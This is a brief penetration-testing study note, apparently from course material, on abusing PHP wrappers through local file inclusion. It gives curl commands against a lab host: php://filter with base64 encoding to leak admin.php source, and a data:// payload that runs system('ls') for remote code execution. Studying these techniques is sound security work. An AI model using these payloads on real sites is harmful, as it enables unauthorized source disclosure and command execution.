#### PHP Wrapper
PHP wrappers can be used to access local or remote filesystems, bypass filters or obtain code execution via file inclusion.

php://filter

and

data://

Example of php filter abuse:
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

By encoding the PHP resource, the browser will display its contents rather than execute.

Decode using base64 to find the contents of sensitive files.

Example of data filter abuse:

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

In this case we are able to achieve RCE.
